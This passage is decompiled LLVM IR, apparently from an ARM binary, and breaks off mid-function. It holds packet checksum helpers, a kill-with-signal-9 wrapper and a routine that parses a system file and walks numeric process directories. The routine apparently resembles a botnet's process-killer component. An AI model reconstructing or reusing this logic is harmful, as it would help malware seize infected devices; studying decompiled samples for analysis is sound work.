  %v1_f1d4 = phi i32 [ 0, %dec_label_pc_f19c ], [ %v2_f1c0, %dec_label_pc_f1ac ]
  %v0_f1cc = phi i32 [ %arg1, %dec_label_pc_f19c ], [ %v1_f1b4, %dec_label_pc_f1ac ]
  %v7_f1cc = icmp eq i32 %v0_f1cc, 1
  br i1 %v7_f1cc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_f1cc
  %v1_f1d0 = load i32, i32* @r0, align 4
  %v2_f1d0 = inttoptr i32 %v1_f1d0 to i8*
  %v3_f1d0 = load i8, i8* %v2_f1d0, align 1
  %v4_f1d0 = zext i8 %v3_f1d0 to i32
  %v3_f1d4 = add i32 %v1_f1d4, %v4_f1d0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_f1cc, %bb
  %v0_f1d8 = phi i32 [ %v1_f1d4, %dec_label_pc_f1cc ], [ %v3_f1d4, %bb ]
  %v3_f1dc = urem i32 %v0_f1d8, 65536
  %v4_f1e0 = udiv i32 %v0_f1d8, 65536
  %v5_f1e0 = add nuw nsw i32 %v4_f1e0, %v3_f1dc
  %v4_f1e4 = udiv i32 %v5_f1e0, 65536
  %v5_f1e4 = add nuw nsw i32 %v4_f1e4, %v5_f1e0
  %v1_f1e8 = urem i32 %v5_f1e4, 65536
  %v3_f1f0 = xor i32 %v1_f1e8, 65535
  ret i32 %v3_f1f0

; uselistorder directives
  uselistorder i32 %v5_f1e0, { 1, 0 }
  uselistorder i32 %v1_f1c4, { 1, 0 }
  uselistorder i32 %v1_f1b4, { 1, 0, 2 }
  uselistorder i32 %v0_f1c4, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_f1f8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_f1f8:
  %v3_f208 = urem i32 %arg2, 65536
  %v1_f20c = add i32 %arg1, 12
  %v1_f210 = inttoptr i32 %v1_f20c to i32*
  %v2_f210 = load i32, i32* %v1_f210, align 4
  %v3_f210 = add i32 %arg1, 16
  %v4_f210 = inttoptr i32 %v3_f210 to i32*
  %v5_f210 = load i32, i32* %v4_f210, align 4
  %v7_f214 = icmp sgt i32 %arg3, 1
  br i1 %v7_f214, label %dec_label_pc_f220.preheader, label %dec_label_pc_f240

dec_label_pc_f220.preheader:                      ; preds = %dec_label_pc_f1f8
  %v0_f220.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_f220

dec_label_pc_f220:                                ; preds = %dec_label_pc_f220.preheader, %dec_label_pc_f220
  %v0_f234 = phi i32 [ 0, %dec_label_pc_f220.preheader ], [ %v2_f234, %dec_label_pc_f220 ]
  %v0_f228 = phi i32 [ %arg3, %dec_label_pc_f220.preheader ], [ %v1_f228, %dec_label_pc_f220 ]
  %v0_f238 = phi i32 [ %v0_f220.pre, %dec_label_pc_f220.preheader ], [ %v1_f238, %dec_label_pc_f220 ]
  %v1_f220 = inttoptr i32 %v0_f238 to i8*
  %v2_f220 = load i8, i8* %v1_f220, align 1
  %v3_f220 = zext i8 %v2_f220 to i32
  %v1_f224 = add i32 %v0_f238, 1
  %v2_f224 = inttoptr i32 %v1_f224 to i8*
  %v3_f224 = load i8, i8* %v2_f224, align 1
  %v4_f224 = zext i8 %v3_f224 to i32
  %v1_f228 = add nsw i32 %v0_f228, -2
  %v4_f22c = mul nuw nsw i32 %v4_f224, 256
  %v5_f22c = or i32 %v4_f22c, %v3_f220
  %v2_f234 = add i32 %v5_f22c, %v0_f234
  %v1_f238 = add i32 %v0_f238, 2
  store i32 %v1_f238, i32* @r1, align 4
  %v8_f23c = icmp sgt i32 %v1_f228, 1
  br i1 %v8_f23c, label %dec_label_pc_f220, label %dec_label_pc_f240

dec_label_pc_f240:                                ; preds = %dec_label_pc_f220, %dec_label_pc_f1f8
  %v1_f248 = phi i32 [ 0, %dec_label_pc_f1f8 ], [ %v2_f234, %dec_label_pc_f220 ]
  %v0_f240 = phi i32 [ %arg3, %dec_label_pc_f1f8 ], [ %v1_f228, %dec_label_pc_f220 ]
  %v7_f240 = icmp eq i32 %v0_f240, 1
  br i1 %v7_f240, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_f240
  %v1_f244 = load i32, i32* @r1, align 4
  %v2_f244 = inttoptr i32 %v1_f244 to i8*
  %v3_f244 = load i8, i8* %v2_f244, align 1
  %v4_f244 = zext i8 %v3_f244 to i32
  %v3_f248 = add i32 %v4_f244, %v1_f248
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_f240, %bb
  %v0_f26c = phi i32 [ %v1_f248, %dec_label_pc_f240 ], [ %v3_f248, %bb ]
  %v3_f250 = urem i32 %v2_f210, 65536
  %v1_f258 = add i32 %arg1, 9
  %v2_f258 = inttoptr i32 %v1_f258 to i8*
  %v3_f258 = load i8, i8* %v2_f258, align 1
  %v4_f258 = zext i8 %v3_f258 to i32
  %v3_f25c = urem i32 %v5_f210, 65536
  %v4_f260 = udiv i32 %v2_f210, 65536
  %v3_f268 = mul nuw nsw i32 %v4_f258, 256
  %v4_f26c = udiv i32 %v5_f210, 65536
  %v5_f26c = add i32 %v0_f26c, %v4_f26c
  %v2_f270 = add i32 %v5_f26c, %v3_f268
  %v5_f260 = add nuw nsw i32 %v3_f250, %v3_f208
  %v2_f264 = add nuw nsw i32 %v5_f260, %v4_f260
  %v2_f274 = add nuw nsw i32 %v2_f264, %v3_f25c
  %v2_f278 = add i32 %v2_f270, %v2_f274
  %tmp = icmp ult i32 %v2_f278, 65536
  br i1 %tmp, label %dec_label_pc_f298, label %dec_label_pc_f284

dec_label_pc_f284:                                ; preds = %.thread, %dec_label_pc_f284
  %v2_f28c1 = phi i32 [ %v2_f28c, %dec_label_pc_f284 ], [ %v2_f278, %.thread ]
  %v3_f2902.in = phi i32 [ %v2_f28c, %dec_label_pc_f284 ], [ %v2_f278, %.thread ]
  %v3_f2902 = udiv i32 %v3_f2902.in, 65536
  %v3_f288 = urem i32 %v2_f28c1, 65536
  %v2_f28c = add nuw nsw i32 %v3_f288, %v3_f2902
  %tmp14 = icmp ult i32 %v2_f28c, 65536
  br i1 %tmp14, label %dec_label_pc_f298.loopexit, label %dec_label_pc_f284

dec_label_pc_f298.loopexit:                       ; preds = %dec_label_pc_f284
  br label %dec_label_pc_f298

dec_label_pc_f298:                                ; preds = %dec_label_pc_f298.loopexit, %.thread
  %v0_f298 = phi i32 [ %v2_f28c, %dec_label_pc_f298.loopexit ], [ %v2_f278, %.thread ]
  %v1_f298 = urem i32 %v0_f298, 65536
  %v3_f2a0 = xor i32 %v1_f298, 65535
  ret i32 %v3_f2a0

; uselistorder directives
  uselistorder i32 %v2_f28c, { 2, 1, 3, 0 }
  uselistorder i32 %v2_f278, { 3, 0, 2, 1 }
  uselistorder i32 %v1_f248, { 1, 0 }
  uselistorder i32 %v1_f238, { 1, 0 }
  uselistorder i32 %v1_f228, { 0, 2, 1 }
  uselistorder i32 %v0_f238, { 0, 2, 1 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f284, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_f220, { 1, 0 }
}

define i32 @function_f2a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_f2a8:
  %r1.global-to-local = alloca i32, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v0_f2b4 = call i32 @_kill()
  %v0_f2b8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f2b8, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_f2a8
  %v1_f2b8 = load i32, i32* @ip, align 4
  %v3_f2b8 = load i32, i32* %r1.global-to-local, align 4
  %v4_f2b8 = inttoptr i32 %v3_f2b8 to i32*
  store i32 %v1_f2b8, i32* %v4_f2b8, align 4
  %v5_f2b8 = load i32, i32* @ip, align 4
  %v6_f2b8 = load i32, i32* %r1.global-to-local, align 4
  %v7_f2b8 = sub i32 %v6_f2b8, %v5_f2b8
  store i32 %v7_f2b8, i32* %r1.global-to-local, align 4
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_f2a8, %bb
  ret i32 %v0_f2b4

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_f2bc(i32 %arg1) local_unnamed_addr {
dec_label_pc_f2bc:
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-68 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-581 = alloca i8, align 1
  %stack_var_-8773 = alloca i32, align 4
  %stack_var_-4677 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_f2bc = load i32, i32* @r4, align 4
  store i32 %v3_f2bc, i32* %stack_var_-36, align 4
  %v6_f2bc = load i32, i32* @r5, align 4
  %v9_f2bc = load i32, i32* @r6, align 4
  %v12_f2bc = load i32, i32* @r7, align 4
  %v15_f2bc = load i32, i32* @r8, align 4
  %v21_f2bc = load i32, i32* @sl, align 4
  %v2_f2d0 = ptrtoint i32* %stack_var_-4677 to i32
  store i32 %v2_f2d0, i32* @sl, align 4
  %v3_f2d8 = mul i32 %arg1, 65536
  store i32 %v3_f2d8, i32* @r5, align 4
  %v2_f2e4 = ptrtoint i32* %stack_var_-8773 to i32
  %v4_f2f0 = call i32* @memset(i32* nonnull %stack_var_-4677, i32 0, i32 4096)
  %v0_f304 = load i32, i32* @r5, align 4
  %v3_f304 = udiv i32 %v0_f304, 65536
  store i32 %v3_f304, i32* %r4.global-to-local, align 4
  %v4_f308 = call i32* @memset(i32* nonnull %stack_var_-8773, i32 0, i32 4096)
  %v2_f30c = ptrtoint i8* %stack_var_-581 to i32
  store i32 %v2_f30c, i32* @r6, align 4
  %v1_f314 = mul nuw nsw i32 %v3_f304, 256
  %v3_f320 = and i32 %v1_f314, 65280
  store i32 %v3_f320, i32* %r4.global-to-local, align 4
  %v2_f328 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_f328, i32* %sb.global-to-local, align 4
  %v3_f32c = bitcast i8* %stack_var_-581 to i32*
  %v4_f32c = call i32* @memset(i32* %v3_f32c, i32 0, i32 513)
  %v2_f330 = ptrtoint i8* %stack_var_-68 to i32
  store i32 %v2_f330, i32* %sb.global-to-local, align 4
  %v0_f338 = load i32, i32* %r4.global-to-local, align 4
  %v1_f338 = load i32, i32* @r5, align 4
  %v4_f338 = udiv i32 %v1_f338, 16777216
  %v5_f338 = or i32 %v4_f338, %v0_f338
  store i32 0, i32* @r4, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_f358 = trunc i32 %v5_f338 to i8
  %v4_f358 = call i32 @function_13f48(i8 %v3_f358, i32 16, i32 %v2_f330)
  %v2_f360 = call i32 @function_13a54(i8* nonnull %stack_var_-68)
  %v7_f364 = icmp eq i32 %v2_f360, 2
  br i1 %v7_f364, label %dec_label_pc_f7f8, label %dec_label_pc_f36c

dec_label_pc_f36c:                                ; preds = %dec_label_pc_f2bc, %dec_label_pc_f7f8
  %v1_f370 = call i32 @function_13128(i32 6)
  %v1_f378 = call i32 @function_13128(i32 7)
  %v1_f380 = call i32 @function_13128(i32 9)
  %v0_f388 = load i32, i32* @r4, align 4
  %v4_f38c = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_143f8.154, i32 0, i32 0), i32 %v0_f388)
  %v7_f390 = icmp eq i32 %v4_f38c, -1
  store i32 %v4_f38c, i32* @r8, align 4
  br i1 %v7_f390, label %dec_label_pc_f7b8, label %dec_label_pc_f39c.preheader

dec_label_pc_f39c.preheader:                      ; preds = %dec_label_pc_f36c
  %v4_f3a856 = call i32 @function_13cac(i32* %v3_f32c, i32 512, i32 %v4_f38c)
  %v2_f3ac58 = icmp eq i32 %v4_f3a856, 0
  br i1 %v2_f3ac58, label %dec_label_pc_f53c.loopexit, label %dec_label_pc_f3b4.lr.ph

dec_label_pc_f3b4.lr.ph:                          ; preds = %dec_label_pc_f39c.preheader
  %v2_f3fc = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_f3b4

dec_label_pc_f3b4:                                ; preds = %dec_label_pc_f3b4.lr.ph, %dec_label_pc_f39c.backedge
  %v3_f3b8 = load i8, i8* %stack_var_-581, align 1
  %v4_f3b8 = sext i8 %v3_f3b8 to i32
  %v2_f3bc = icmp eq i8 %v3_f3b8, 0
  br i1 %v2_f3bc, label %bb128, label %bb

bb:                                               ; preds = %dec_label_pc_f3b4
  %v8_f3c0 = icmp eq i8 %v3_f3b8, 58
  br i1 %v8_f3c0, label %.thread6, label %dec_label_pc_f3d4

.thread6:                                         ; preds = %bb
  br label %dec_label_pc_f3ec

bb128:                                            ; preds = %dec_label_pc_f3b4
  br label %dec_label_pc_f3ec

dec_label_pc_f3d4:                                ; preds = %bb
  %v1_f3dc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_f3d8

dec_label_pc_f3d8:                                ; preds = %bb129, %dec_label_pc_f3d4
  %v0_f3d8 = phi i32 [ %v1_f3d8, %bb129 ], [ 0, %dec_label_pc_f3d4 ]
  %v1_f3d8 = add i32 %v0_f3d8, 1
  %v2_f3dc = add i32 %v1_f3d8, %v1_f3dc.pre
  %v3_f3dc = inttoptr i32 %v2_f3dc to i8*
  %v4_f3dc = load i8, i8* %v3_f3dc, align 1
  %v6_f3dc = zext i8 %v4_f3dc to i32
  %v2_f3e0 = icmp eq i8 %v4_f3dc, 0
  br i1 %v2_f3e0, label %dec_label_pc_f3ec, label %bb129

bb129:                                            ; preds = %dec_label_pc_f3d8
  %v8_f3e4 = icmp eq i8 %v4_f3dc, 58
  br i1 %v8_f3e4, label %dec_label_pc_f3ec, label %dec_label_pc_f3d8

dec_label_pc_f3ec:                                ; preds = %dec_label_pc_f3d8, %bb129, %bb128, %.thread6
  %v1_f418 = phi i32 [ 0, %.thread6 ], [ 0, %bb128 ], [ %v1_f3d8, %bb129 ], [ %v1_f3d8, %dec_label_pc_f3d8 ]
  %v0_f3ec = phi i32 [ %v4_f3b8, %.thread6 ], [ %v4_f3b8, %bb128 ], [ %v6_f3dc, %bb129 ], [ %v6_f3dc, %dec_label_pc_f3d8 ]
  %v2_f3ec = icmp eq i32 %v0_f3ec, 0
  br i1 %v2_f3ec, label %dec_label_pc_f39c.backedge, label %dec_label_pc_f3f4

dec_label_pc_f39c.backedge:                       ; preds = %dec_label_pc_f3ec, %dec_label_pc_f4c4, %dec_label_pc_f510, %dec_label_pc_f438
  %v0_f3a4 = load i32, i32* @r8, align 4
  %v4_f3a8 = call i32 @function_13cac(i32* %v3_f32c, i32 512, i32 %v0_f3a4)
  %v2_f3ac = icmp eq i32 %v4_f3a8, 0
  br i1 %v2_f3ac, label %dec_label_pc_f53c.loopexit, label %dec_label_pc_f3b4

dec_label_pc_f3f4:                                ; preds = %dec_label_pc_f3ec
  %v1_f3f8 = add i32 %v1_f418, 2
  %v2_f400 = add i32 %v1_f3f8, %v2_f3fc
  %v1_f404 = add i32 %v2_f400, -545
  %v2_f404 = inttoptr i32 %v1_f404 to i8*
  %v3_f404 = load i8, i8* %v2_f404, align 1
  %v2_f408 = icmp eq i8 %v3_f404, 0
  br i1 %v2_f408, label %bb131, label %bb130

bb130:                                            ; preds = %dec_label_pc_f3f4
  %v8_f40c = icmp eq i8 %v3_f404, 32
  br i1 %v8_f40c, label %.thread10, label %dec_label_pc_f418

.thread10:                                        ; preds = %bb130
  store i32 %v1_f3f8, i32* @r5, align 4
  br label %dec_label_pc_f438

bb131:                                            ; preds = %dec_label_pc_f3f4
  store i32 %v1_f3f8, i32* @r5, align 4
  br label %dec_label_pc_f438

dec_label_pc_f418:                                ; preds = %bb130
  %v0_f418 = load i32, i32* @r6, align 4
  %v2_f418 = add i32 %v0_f418, %v1_f418
  br label %dec_label_pc_f41c

dec_label_pc_f41c:                                ; preds = %bb132, %dec_label_pc_f418
  %v0_f42813 = phi i32 [ %v1_f428, %bb132 ], [ %v2_f418, %dec_label_pc_f418 ]
  %v1_f41c = add i32 %v0_f42813, 3
  %v2_f41c = inttoptr i32 %v1_f41c to i8*
  %v3_f41c = load i8, i8* %v2_f41c, align 1
  %v2_f420 = icmp eq i8 %v3_f41c, 0
  br i1 %v2_f420, label %.thread12, label %bb132

.thread12:                                        ; preds = %dec_label_pc_f41c
  %v1_f42814 = add i32 %v0_f42813, 1
  br label %dec_label_pc_f430

bb132:                                            ; preds = %dec_label_pc_f41c
  %v8_f424 = icmp eq i8 %v3_f41c, 32
  %v1_f428 = add i32 %v0_f42813, 1
  br i1 %v8_f424, label %dec_label_pc_f430, label %dec_label_pc_f41c

dec_label_pc_f430:                                ; preds = %bb132, %.thread12
  %v1_f42815 = phi i32 [ %v1_f42814, %.thread12 ], [ %v1_f428, %bb132 ]
  %v2_f430 = sub i32 %v1_f42815, %v0_f418
  %v1_f434 = add i32 %v2_f430, 2
  store i32 %v1_f434, i32* @r5, align 4
  br label %dec_label_pc_f438

dec_label_pc_f438:                                ; preds = %bb131, %.thread10, %dec_label_pc_f430
  %v1_f444 = phi i32 [ %v1_f3f8, %.thread10 ], [ %v1_f3f8, %bb131 ], [ %v1_f434, %dec_label_pc_f430 ]
  %v0_f438 = load i32, i32* @r6, align 4
  %v2_f438 = add i32 %v0_f438, %v1_f3f8
  store i32 %v2_f438, i32* @r4, align 4
  %v2_f444 = add i32 %v1_f444, %v2_f3fc
  store i32 0, i32* @r7, align 4
  %v3_f450 = add i32 %v2_f444, -545
  %v4_f450 = inttoptr i32 %v3_f450 to i8*
  store i8 0, i8* %v4_f450, align 1
  %v1_f454 = inttoptr i32 %v2_f438 to i8*
  %v2_f454 = call i32 @function_13a54(i8* %v1_f454)
  store i32 %v2_f454, i32* @r1, align 4
  %v0_f460 = load i32, i32* @r4, align 4
  %v3_f464 = inttoptr i32 %v0_f460 to i8*
  %v4_f464 = call i32 @function_13da8(i8* %v3_f464, i32 %v2_f454, i32 %v2_f330)
  %v7_f468 = icmp eq i32 %v4_f464, -1
  br i1 %v7_f468, label %dec_label_pc_f39c.backedge, label %dec_label_pc_f484.preheader

dec_label_pc_f484.preheader:                      ; preds = %dec_label_pc_f438
  %v1_f46c = load i32, i32* @r7, align 4
  %v1_f470 = load i32, i32* @r6, align 4
  %v2_f470 = load i32, i32* @r5, align 4
  %v3_f470 = add i32 %v2_f470, %v1_f470
  store i32 %v1_f46c, i32* @r4, align 4
  %v1_f48448 = add i32 %v3_f470, 2
  %v2_f48449 = inttoptr i32 %v1_f48448 to i8*
  %v3_f48450 = load i8, i8* %v2_f48449, align 1
  %v2_f48852 = icmp eq i8 %v3_f48450, 0
  %v1_f48c54 = add i32 %v2_f470, 2
  br i1 %v2_f48852, label %dec_label_pc_f4c4, label %dec_label_pc_f494

dec_label_pc_f494:                                ; preds = %dec_label_pc_f484.preheader, %dec_label_pc_f484.backedge
  %v0_f4c484 = phi i32 [ %v0_f4c483, %dec_label_pc_f484.backedge ], [ %v1_f46c, %dec_label_pc_f484.preheader ]
  %v0_f4ac.pr = phi i32 [ %v0_f4ac.pr69, %dec_label_pc_f484.backedge ], [ %v1_f46c, %dec_label_pc_f484.preheader ]
  %v0_f7c8 = phi i32 [ %v0_f7c872, %dec_label_pc_f484.backedge ], [ %v1_f46c, %dec_label_pc_f484.preheader ]
  %v0_f48c80 = phi i32 [ %v1_f48c, %dec_label_pc_f484.backedge ], [ %v1_f48c54, %dec_label_pc_f484.preheader ]
  %v0_f4bc = phi i32 [ %v0_f484, %dec_label_pc_f484.backedge ], [ %v3_f470, %dec_label_pc_f484.preheader ]
  %v1_f498.in = phi i8 [ %v3_f484, %dec_label_pc_f484.backedge ], [ %v3_f48450, %dec_label_pc_f484.preheader ]
  %v7_f494 = icmp eq i8 %v1_f498.in, 9
  br i1 %v7_f494, label %.thread23, label %bb133

bb133:                                            ; preds = %dec_label_pc_f494
  %v8_f498 = icmp eq i8 %v1_f498.in, 32
  br i1 %v8_f498, label %.thread23.thread35, label %dec_label_pc_f4ac

.thread23.thread35:                               ; preds = %bb133
  br label %dec_label_pc_f4b8

.thread23:                                        ; preds = %dec_label_pc_f494
  br label %dec_label_pc_f4b8

dec_label_pc_f4ac:                                ; preds = %bb133
  %v7_f4ac = icmp eq i32 %v0_f4ac.pr, 1
  br i1 %v7_f4ac, label %dec_label_pc_f7c8, label %dec_label_pc_f4b4

dec_label_pc_f4b4:                                ; preds = %dec_label_pc_f7c8, %dec_label_pc_f4ac
  %v0_f4b877 = phi i32 [ %v1_f7c8, %dec_label_pc_f7c8 ], [ %v0_f7c8, %dec_label_pc_f4ac ]
  br label %dec_label_pc_f4b8

dec_label_pc_f4b8:                                ; preds = %.thread23, %.thread23.thread35, %dec_label_pc_f4b4
  %v0_f4b8 = phi i32 [ %v0_f7c8, %.thread23.thread35 ], [ %v0_f7c8, %.thread23 ], [ %v0_f4b877, %dec_label_pc_f4b4 ]
  %v0_f4ac.pr70 = phi i32 [ 1, %.thread23.thread35 ], [ 1, %.thread23 ], [ 0, %dec_label_pc_f4b4 ]
  %v7_f4c0 = icmp sgt i32 %v0_f4b8, 6
  br i1 %v7_f4c0, label %dec_label_pc_f4c4, label %dec_label_pc_f484.backedge

dec_label_pc_f4c4:                                ; preds = %dec_label_pc_f484.backedge, %dec_label_pc_f4b8, %dec_label_pc_f484.preheader
  %v1_f514 = phi i32 [ %v1_f48c54, %dec_label_pc_f484.preheader ], [ %v1_f48c, %dec_label_pc_f484.backedge ], [ %v0_f48c80, %dec_label_pc_f4b8 ]
  %v0_f4c4 = phi i32 [ %v1_f46c, %dec_label_pc_f484.preheader ], [ %v0_f4c483, %dec_label_pc_f484.backedge ], [ %v0_f4c484, %dec_label_pc_f4b8 ]
  %v2_f4c4 = icmp eq i32 %v0_f4c4, 0
  br i1 %v2_f4c4, label %dec_label_pc_f39c.backedge, label %dec_label_pc_f4d0

dec_label_pc_f4d0:                                ; preds = %dec_label_pc_f4c4
  %v2_f4d8 = add i32 %v1_f514, %v2_f3fc
  %v1_f4dc = add i32 %v2_f4d8, -545
  %v2_f4dc = inttoptr i32 %v1_f4dc to i8*
  %v3_f4dc = load i8, i8* %v2_f4dc, align 1
  %v2_f4e0 = icmp eq i8 %v3_f4dc, 0
  br i1 %v2_f4e0, label %dec_label_pc_f510, label %bb134

bb134:                                            ; preds = %dec_label_pc_f4d0
  %v8_f4e4 = icmp eq i8 %v3_f4dc, 32
  br i1 %v8_f4e4, label %dec_label_pc_f510, label %dec_label_pc_f4ec

dec_label_pc_f4ec:                                ; preds = %bb134
  %v2_f4ec = add i32 %v1_f514, %v1_f470
  br label %dec_label_pc_f4f0

dec_label_pc_f4f0:                                ; preds = %bb135, %dec_label_pc_f4ec
  %v0_f4fc28 = phi i32 [ %v1_f4fc, %bb135 ], [ %v1_f514, %dec_label_pc_f4ec ]
  %v0_f4f0 = phi i32 [ %v1_f4f0, %bb135 ], [ %v2_f4ec, %dec_label_pc_f4ec ]
  %v1_f4f0 = add i32 %v0_f4f0, 1
  %v2_f4f0 = inttoptr i32 %v1_f4f0 to i8*
  %v3_f4f0 = load i8, i8* %v2_f4f0, align 1
  %v2_f4f4 = icmp eq i8 %v3_f4f0, 0
  br i1 %v2_f4f4, label %.thread27, label %bb135

.thread27:                                        ; preds = %dec_label_pc_f4f0
  %v1_f4fc29 = add i32 %v0_f4fc28, 1
  br label %dec_label_pc_f504

bb135:                                            ; preds = %dec_label_pc_f4f0
  %v8_f4f8 = icmp eq i8 %v3_f4f0, 32
  %v1_f4fc = add i32 %v0_f4fc28, 1
  br i1 %v8_f4f8, label %dec_label_pc_f504, label %dec_label_pc_f4f0

dec_label_pc_f504:                                ; preds = %bb135, %.thread27
  %v1_f50c = phi i32 [ %v1_f4fc29, %.thread27 ], [ %v1_f4fc, %bb135 ]
  %v2_f50c = add i32 %v1_f50c, %v2_f3fc
  br label %dec_label_pc_f510

dec_label_pc_f510:                                ; preds = %dec_label_pc_f4d0, %bb134, %dec_label_pc_f504
  %v2_f51c = phi i32 [ %v2_f4d8, %dec_label_pc_f4d0 ], [ %v2_f4d8, %bb134 ], [ %v2_f50c, %dec_label_pc_f504 ]
  %v2_f514 = add i32 %v1_f514, %v1_f470
  store i32 %v2_f514, i32* @r4, align 4
  %v3_f51c = add i32 %v2_f51c, -545
  %v4_f51c = inttoptr i32 %v3_f51c to i8*
  store i8 0, i8* %v4_f51c, align 1
  %v1_f520 = inttoptr i32 %v2_f514 to i8*
  %v2_f520 = call i32 @function_13a54(i8* %v1_f520)
  %v8_f528 = icmp sgt i32 %v2_f520, 15
  br i1 %v8_f528, label %dec_label_pc_f39c.backedge, label %dec_label_pc_f52c

dec_label_pc_f52c:                                ; preds = %dec_label_pc_f510
  %v0_f530 = load i32, i32* @r4, align 4
  %v2_f534 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_f534, i32* @r0, align 4
  %v2_f538 = bitcast i32* %stack_var_-52 to i8*
  %v3_f538 = call i32 @function_13a7c(i8* %v2_f538, i32 %v0_f530)
  br label %dec_label_pc_f53c

dec_label_pc_f53c.loopexit:                       ; preds = %dec_label_pc_f39c.backedge, %dec_label_pc_f39c.preheader
  %.pre = ptrtoint i32* %stack_var_-52 to i32
  %.pre97 = bitcast i32* %stack_var_-52 to i8*
  br label %dec_label_pc_f53c

dec_label_pc_f53c:                                ; preds = %dec_label_pc_f53c.loopexit, %dec_label_pc_f52c
  %v1_f54c.pre-phi = phi i8* [ %.pre97, %dec_label_pc_f53c.loopexit ], [ %v2_f538, %dec_label_pc_f52c ]
  %v2_f548.pre-phi = phi i32 [ %.pre, %dec_label_pc_f53c.loopexit ], [ %v2_f534, %dec_label_pc_f52c ]
  %v0_f53c = load i32, i32* @r8, align 4
  %v1_f540 = call i32 @close(i32 %v0_f53c)
  %v2_f54c = call i32 @function_13a54(i8* %v1_f54c.pre-phi)
  store i32 %v2_f54c, i32* @r4, align 4
  %v2_f550 = icmp eq i32 %v2_f54c, 0
  br i1 %v2_f550, label %dec_label_pc_f7a0, label %dec_label_pc_f558

dec_label_pc_f558:                                ; preds = %dec_label_pc_f53c
  %v3_f560 = call i32 @function_13044(i32 6, i32* null)
  %v4_f560 = inttoptr i32 %v3_f560 to i8*
  %v3_f564 = call %__dirstream* @opendir(i8* %v4_f560)
  %v5_f564 = ptrtoint %__dirstream* %v3_f564 to i32
  store i32 %v5_f564, i32* @r8, align 4
  %v2_f568 = icmp eq %__dirstream* %v3_f564, null
  br i1 %v2_f568, label %dec_label_pc_f798, label %dec_label_pc_f578.preheader

dec_label_pc_f578.preheader:                      ; preds = %dec_label_pc_f558
  store i32 0, i32* @r5, align 4
  %v1_f57c44 = call i32 @_readdir(i32 %v5_f564)
  %v2_f58046 = icmp eq i32 %v1_f57c44, 0
  br i1 %v2_f58046, label %dec_label_pc_f78c, label %dec_label_pc_f588.preheader.lr.ph

dec_label_pc_f588.preheader.lr.ph:                ; preds = %dec_label_pc_f578.preheader
  %v2_f5b8 = bitcast i32* %stack_var_-4677 to i8*
  %v1_f724 = bitcast i32* %stack_var_-8773 to i8*
  br label %dec_label_pc_f588.preheader

dec_label_pc_f578.loopexit:                       ; preds = %dec_label_pc_f590, %dec_label_pc_f5a4, %dec_label_pc_f60c
  %v0_f578 = load i32, i32* @r8, align 4
  %v1_f57c = call i32 @_readdir(i32 %v0_f578)
  %v2_f580 = icmp eq i32 %v1_f57c, 0
  br i1 %v2_f580, label %dec_label_pc_f78c, label %dec_label_pc_f588.preheader

dec_label_pc_f588.preheader:                      ; preds = %dec_label_pc_f588.preheader.lr.ph, %dec_label_pc_f578.loopexit
  %v0_f59092 = phi i32 [ %v1_f57c44, %dec_label_pc_f588.preheader.lr.ph ], [ %v1_f57c, %dec_label_pc_f578.loopexit ]
  br label %dec_label_pc_f588

dec_label_pc_f588:                                ; preds = %dec_label_pc_f588.preheader, %dec_label_pc_f774
  %v0_f59c = phi i32 [ %v0_f59092, %dec_label_pc_f588.preheader ], [ %v1_f780, %dec_label_pc_f774 ]
  %v0_f588 = load i32, i32* @r5, align 4
  %v2_f588 = icmp eq i32 %v0_f588, 0
  br i1 %v2_f588, label %dec_label_pc_f590, label %dec_label_pc_f78c

dec_label_pc_f590:                                ; preds = %dec_label_pc_f588
  %v1_f590 = add i32 %v0_f59c, 11
  %v2_f590 = inttoptr i32 %v1_f590 to i8*
  %v3_f590 = load i8, i8* %v2_f590, align 1
  %v4_f590 = zext i8 %v3_f590 to i32
  %v1_f594 = add nsw i32 %v4_f590, -48
  store i32 %v1_f590, i32* @r7, align 4
  %tmp = icmp ugt i32 %v1_f594, 9
  br i1 %tmp, label %dec_label_pc_f578.loopexit, label %dec_label_pc_f5a4

dec_label_pc_f5a4:                                ; preds = %dec_label_pc_f590
  %v3_f5ac = call i32 @function_13044(i32 6, i32* null)
  store i32 %v2_f2d0, i32* @r0, align 4
  %v3_f5b8 = call i32 @function_13a7c(i8* %v2_f5b8, i32 %v3_f5ac)
  %v2_f5c0 = call i32 @function_13a54(i8* %v2_f5b8)
  %v0_f5c4 = load i32, i32* @r7, align 4
  %v0_f5c8 = load i32, i32* @sl, align 4
  %v2_f5c8 = add i32 %v0_f5c8, %v2_f5c0
  store i32 %v2_f5c8, i32* @r0, align 4
  %v2_f5cc = inttoptr i32 %v2_f5c8 to i8*
  %v3_f5cc = call i32 @function_13a7c(i8* %v2_f5cc, i32 %v0_f5c4)
  %v2_f5d4 = call i32 @function_13a54(i8* %v2_f5b8)
  %v0_f5d8 = load i32, i32* @r5, align 4
  store i32 %v2_f5d4, i32* %r4.global-to-local, align 4
